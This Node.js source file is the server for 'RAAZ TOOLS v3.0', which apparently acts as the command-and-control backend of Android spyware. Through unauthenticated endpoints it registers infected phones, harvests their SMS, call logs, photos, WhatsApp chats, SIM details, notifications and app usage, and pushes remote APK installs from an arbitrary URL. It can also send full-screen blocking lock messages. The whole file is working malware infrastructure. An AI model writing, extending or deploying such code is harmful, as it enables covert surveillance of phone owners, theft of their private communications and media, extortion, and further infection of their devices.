// ╔══════════════════════════════════════════════════════════════╗
// ║           RAAZ TOOLS - SERVER v3.0 (Render Deploy)          ║
// ║   All Features: SMS, Calls, Gallery, WhatsApp, APK,         ║
// ║   Notifications, SIM, Battery, Toast Lock, Flashlight       ║
// ╚══════════════════════════════════════════════════════════════╝

const express = require('express');
const admin   = require('firebase-admin');
const app     = express();
const PORT    = process.env.PORT || 3000;

// ─── Firebase Init ────────────────────────────────────────────────────────────
const serviceAccount = require('./serviceAccountKey.json');
admin.initializeApp({
  credential:  admin.credential.cert(serviceAccount),
  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // ← apna URL
});

const db = admin.database();
app.use(express.json({ limit: '50mb' }));

// ─── CORS (optional, useful for web panel later) ─────────────────────────────
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

// ─── Helper: Wait for device response via Firebase ───────────────────────────
async function waitForResponse(deviceId, requestType, requestId, timeout = 20000) {
  const responseRef = db.ref(`responses/${deviceId}/${requestType}`);
  return new Promise((resolve, reject) => {
    let responded = false;
    const listener = responseRef.on('value', (snapshot) => {
      if (!responded && snapshot.exists()) {
        const data = snapshot.val();
        if (data && data.requestId === requestId) {
          responded = true;
          clearTimeout(timer);
          responseRef.off('value', listener);
          responseRef.remove();
          resolve(data);
        }
      }
    });
    const timer = setTimeout(() => {
      if (!responded) {
        responded = true;
        responseRef.off('value', listener);
        reject(new Error(`Timeout: device did not respond in ${timeout}ms`));
      }
    }, timeout);
  });
}

// ─── Helper: Push command to device ──────────────────────────────────────────
async function pushCommand(deviceId, command, extra = {}) {
  const ref = await db.ref(`commands/${deviceId}`).push({
    command,
    ...extra,
    timestamp: admin.database.ServerValue.TIMESTAMP,
    status: 'pending'
  });
  return ref.key;
}

// ════════════════════════════════════════════════════════════════
//   ROOT — Health Check
// ════════════════════════════════════════════════════════════════
app.get('/', (req, res) => {
  res.json({
    status: '✅ RAAZ TOOLS Server Running',
    version: '3.0',
    endpoints: [
      'GET  /api/devices',
      'POST /api/register',
      'POST /api/command',
      'GET  /api/battery/:deviceId',
      'POST /api/battery',
      'GET  /api/sms/:deviceId',
      'GET  /api/calls/:deviceId',
      'GET  /api/gallery/:deviceId',
      'GET  /api/whatsapp/:deviceId',
      'GET  /api/installedApps/:deviceId',
      'GET  /api/simInfo/:deviceId',
      'POST /api/installApk',
      'GET  /api/notifications/:deviceId',
      'POST /api/notification',
      'GET  /api/usage/:deviceId',
      'POST /api/usage',
      'POST /api/toast',
      'POST /api/dismissToast',
      'DELETE /api/device/:deviceId'
    ]
  });
});

// ════════════════════════════════════════════════════════════════
//   DEVICE REGISTRATION & STATUS
// ════════════════════════════════════════════════════════════════
app.post('/api/register', async (req, res) => {
  const { deviceId, info } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  try {
    await db.ref(`onlineDevices/${deviceId}`).set({
      info: info || {},
      lastSeen: admin.database.ServerValue.TIMESTAMP,
      online: true
    });
    res.json({ status: 'registered', deviceId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Get all online devices (online within last 2 minutes)
app.get('/api/devices', async (req, res) => {
  try {
    const snapshot = await db.ref('onlineDevices').once('value');
    const devices = [];
    const now = Date.now();
    snapshot.forEach(child => {
      const device = child.val();
      const isOnline = (now - device.lastSeen) < 120000; // 2 min
      if (isOnline) {
        devices.push({ deviceId: child.key, info: device.info, lastSeen: device.lastSeen });
      } else {
        child.ref.update({ online: false });
      }
    });
    res.json(devices);
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Delete/remove a device
app.delete('/api/device/:deviceId', async (req, res) => {
  try {
    await db.ref(`onlineDevices/${req.params.deviceId}`).remove();
    res.json({ status: 'removed' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   SEND COMMAND (flashlight, custom commands, etc.)
// ════════════════════════════════════════════════════════════════
app.post('/api/command', async (req, res) => {
  const { deviceId, command, extra } = req.body;
  if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
  try {
    const key = await pushCommand(deviceId, command, extra ? { extra } : {});
    res.json({ status: 'queued', deviceId, command, key });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   BATTERY
// ════════════════════════════════════════════════════════════════
// Device posts battery status
app.post('/api/battery', async (req, res) => {
  const { deviceId, level, charging } = req.body;
  if (!deviceId || level == null) return res.status(400).json({ error: 'Missing data' });
  try {
    await db.ref(`battery/${deviceId}`).push({
      level,
      charging: charging || false,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    res.json({ status: 'logged' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Get latest battery status
app.get('/api/battery/:deviceId', async (req, res) => {
  try {
    const snap = await db.ref(`battery/${req.params.deviceId}`)
      .orderByKey().limitToLast(1).once('value');
    let latest = null;
    snap.forEach(child => { latest = { id: child.key, ...child.val() }; });
    res.json(latest || { level: 0, charging: false });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   SMS
// ════════════════════════════════════════════════════════════════
app.get('/api/sms/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/sms`).set({
      requestId,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    const response = await waitForResponse(deviceId, 'sms', requestId, 15000);
    res.json({ smsList: response.smsList || [] });
  } catch (e) {
    res.status(408).json({ error: e.message, smsList: [] });
  }
});

// ════════════════════════════════════════════════════════════════
//   CALL LOGS
// ════════════════════════════════════════════════════════════════
app.get('/api/calls/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/calls`).set({
      requestId,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    const response = await waitForResponse(deviceId, 'calls', requestId, 15000);
    res.json({ callList: response.callList || [] });
  } catch (e) {
    res.status(408).json({ error: e.message, callList: [] });
  }
});

// ════════════════════════════════════════════════════════════════
//   GALLERY IMAGES
// ════════════════════════════════════════════════════════════════
app.get('/api/gallery/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/gallery`).set({
      requestId,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    const response = await waitForResponse(deviceId, 'gallery', requestId, 20000);
    res.json({ images: response.images || [] });
  } catch (e) {
    res.status(408).json({ error: e.message, images: [] });
  }
});

// ════════════════════════════════════════════════════════════════
//   WHATSAPP CHATS
// ════════════════════════════════════════════════════════════════
app.get('/api/whatsapp/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/whatsapp`).set({
      requestId,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    const response = await waitForResponse(deviceId, 'whatsapp', requestId, 15000);
    res.json({ chats: response.chats || [] });
  } catch (e) {
    res.status(408).json({ error: e.message, chats: [] });
  }
});

// ════════════════════════════════════════════════════════════════
//   INSTALLED APPS
// ════════════════════════════════════════════════════════════════
app.get('/api/installedApps/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/installedApps`).set({
      requestId,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    const response = await waitForResponse(deviceId, 'installedApps', requestId, 15000);
    res.json({ apps: response.apps || [] });
  } catch (e) {
    res.status(408).json({ error: e.message, apps: [] });
  }
});

// ════════════════════════════════════════════════════════════════
//   SIM INFO
// ════════════════════════════════════════════════════════════════
app.get('/api/simInfo/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/simInfo`).set({
      requestId,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    const response = await waitForResponse(deviceId, 'simInfo', requestId, 15000);
    res.json({ simList: response.simList || [] });
  } catch (e) {
    res.status(408).json({ error: e.message, simList: [] });
  }
});

// ════════════════════════════════════════════════════════════════
//   INSTALL APK (Download + Install on device)
// ════════════════════════════════════════════════════════════════
app.post('/api/installApk', async (req, res) => {
  const { deviceId, url } = req.body;
  if (!deviceId || !url) return res.status(400).json({ error: 'deviceId and url required' });
  const requestId = Date.now().toString();
  try {
    await db.ref(`requests/${deviceId}/installApk`).set({
      requestId,
      url,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    // Longer timeout since APK needs to download first
    const response = await waitForResponse(deviceId, 'installApk', requestId, 60000);
    res.json({ status: 'success', result: response.result });
  } catch (e) {
    // Still queued even on timeout — download may still be happening
    res.status(202).json({ status: 'queued', message: 'APK download initiated on device', error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   NOTIFICATIONS — Get recent from Firebase
// ════════════════════════════════════════════════════════════════
app.get('/api/notifications/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const limit = parseInt(req.query.limit) || 20;
  try {
    const snap = await db.ref(`notifications/${deviceId}`)
      .orderByKey().limitToLast(limit).once('value');
    const notifs = [];
    snap.forEach(child => notifs.push({ id: child.key, ...child.val() }));
    res.json(notifs.reverse()); // Latest first
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Device posts a new notification
app.post('/api/notification', async (req, res) => {
  const { deviceId, packageName, title, text, timestamp } = req.body;
  if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });
  try {
    await db.ref(`notifications/${deviceId}`).push({
      packageName,
      title:     title || '',
      text:      text || '',
      timestamp: timestamp || admin.database.ServerValue.TIMESTAMP
    });
    res.json({ status: 'logged' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   APP USAGE LOGS
// ════════════════════════════════════════════════════════════════
app.get('/api/usage/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  const limit = parseInt(req.query.limit) || 20;
  try {
    const snap = await db.ref(`usage/${deviceId}`)
      .orderByKey().limitToLast(limit).once('value');
    const usage = [];
    snap.forEach(child => usage.push({ id: child.key, ...child.val() }));
    res.json(usage.reverse());
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/usage', async (req, res) => {
  const { deviceId, packageName, appName } = req.body;
  if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });
  try {
    await db.ref(`usage/${deviceId}`).push({
      packageName,
      appName:   appName || packageName,
      timestamp: admin.database.ServerValue.TIMESTAMP
    });
    res.json({ status: 'logged' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   🔥 TOAST / FULL SCREEN LOCK MESSAGE
// ════════════════════════════════════════════════════════════════
// Send a full-screen blocking message to device
app.post('/api/toast', async (req, res) => {
  const { deviceId, message } = req.body;
  if (!deviceId || !message) return res.status(400).json({ error: 'deviceId and message required' });
  try {
    const key = await pushCommand(deviceId, 'showToast', { extra: message });
    res.json({ status: 'sent', key, message });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Dismiss the full-screen lock message
app.post('/api/dismissToast', async (req, res) => {
  const { deviceId } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  try {
    const key = await pushCommand(deviceId, 'dismissToast');
    res.json({ status: 'dismiss sent', key });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   FLASHLIGHT (via command endpoint)
// ════════════════════════════════════════════════════════════════
app.post('/api/flashlight', async (req, res) => {
  const { deviceId, state } = req.body; // state: 'on' or 'off'
  if (!deviceId || !state) return res.status(400).json({ error: 'deviceId and state required' });
  try {
    const key = await pushCommand(deviceId, `flashlight ${state}`);
    res.json({ status: 'queued', key });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   CLEAR ALL DATA FOR DEVICE (utility)
// ════════════════════════════════════════════════════════════════
app.delete('/api/clear/:deviceId', async (req, res) => {
  const { deviceId } = req.params;
  try {
    await Promise.all([
      db.ref(`commands/${deviceId}`).remove(),
      db.ref(`requests/${deviceId}`).remove(),
      db.ref(`responses/${deviceId}`).remove(),
      db.ref(`results/${deviceId}`).remove(),
    ]);
    res.json({ status: 'cleared', deviceId });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   HEARTBEAT — device sends ping every 30s
// ════════════════════════════════════════════════════════════════
app.post('/api/heartbeat', async (req, res) => {
  const { deviceId, info } = req.body;
  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
  try {
    await db.ref(`onlineDevices/${deviceId}`).update({
      lastSeen: admin.database.ServerValue.TIMESTAMP,
      online: true,
      ...(info ? { info } : {})
    });
    res.json({ status: 'alive' });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// ════════════════════════════════════════════════════════════════
//   START SERVER
// ════════════════════════════════════════════════════════════════
app.listen(PORT, () => {
  console.log(`\n╔═══════════════════════════════════════╗`);
  console.log(`║   ✅  RAAZ TOOLS SERVER v3.0          ║`);
  console.log(`║   🚀  Running on port ${PORT}             ║`);
  console.log(`╚═══════════════════════════════════════╝\n`);
});
